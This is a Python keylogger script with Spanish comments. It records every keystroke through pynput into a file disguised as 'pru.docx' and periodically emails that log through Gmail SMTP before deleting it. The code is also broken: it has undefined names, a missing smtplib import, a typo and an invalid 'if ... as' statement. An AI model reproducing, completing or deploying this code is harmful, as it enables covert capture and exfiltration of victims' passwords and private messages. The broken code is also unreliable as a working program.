import os, sys, datetime, time, getpass
from pynput.keyboard import Key, Listener
from email import encoders
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def email():
    usuario = "correo que enviara el mensaje"
    contra = "contraseña " 
    destinatario = "correo que recibira el reporte"
    asunto="Reporte" #mensaje del correo
    mensaje = MIMEMultipart("alternative") 
    mensaje["Subject"] = asunto
    mensaje["From"] = usuario
    mensaje["To"] = destinatario
    html = f"""
    <html>
    <body>
        REPORTE {destinatario}<br>
        REPORTE DEL MOMENTO :)
    </body>
    </html>
    """# mensaje adjunto al usuario

    archivo="pru.docx"
    with open(archivo, "rb") as adjunto:
        contenido_adjunto = MIMEBase("application", "octet-stream")
        contenido_adjunto.set_payload(adjunto.read())
        meaje.attach(contenido_adjunto)
        if smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(username,contra)
            print("INICIANDO SESION")
            server.sendmail(username, destinatario, mensaje_final)
            print("REPORTE ENVIADO")

def teclas(tecla):
    global llaves,count,active,arr

    if tecla == Key.enter:

        for i in range(len(llaves)):
            if active %2 !=0:
                llaves[i] = str(llaves[i]).upper()

            if llaves[i] == "+":
                active+=1


        llaves.append("\n")

        lista(llaves,count)
        llaves=[]
        arr=[]
        
        count+=1
        if count>4:
            email()
            if os.path.exists("pru.docx"):
                os.remove("pru.docx")
            count=0


    elif tecla=='"':
        llaves.append('"')
    elif tecla== Key.shift_r:
        llaves.append("")
        
    elif tecla== Key.ctrl_l:
        llaves.append("")

    elif tecla == Key.space:
        llaves.append(" ")  

   

    elif tecla == Key.caps_lock:
        llaves.append("+")

    else:
        llaves.append(tecla)

    print("{0}".format(tecla))
    
def write_file(llaves,count):
    with open("pru.docx", "a") as f:
        f.write(time.strftime("%d/%m/%y   "))
        f.write(time.strftime("%I:%M:%S   "))
        for tecla in llaves:
            k=str(tecla).replace("'","")

            if k.find("\n")>0:
                f.write(k)
            
           
                
            elif k.find('tecla')== -1:
                f.write(k)
            
        
def on_release(tecla):
    
    if tecla == tecla.esc:
        return False
    
def main():
    if os.path.exists("pru.docx"):
        os.remove("pru.docx")
    else:  
        pass
    
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
if __name__== '__main__':
    main()
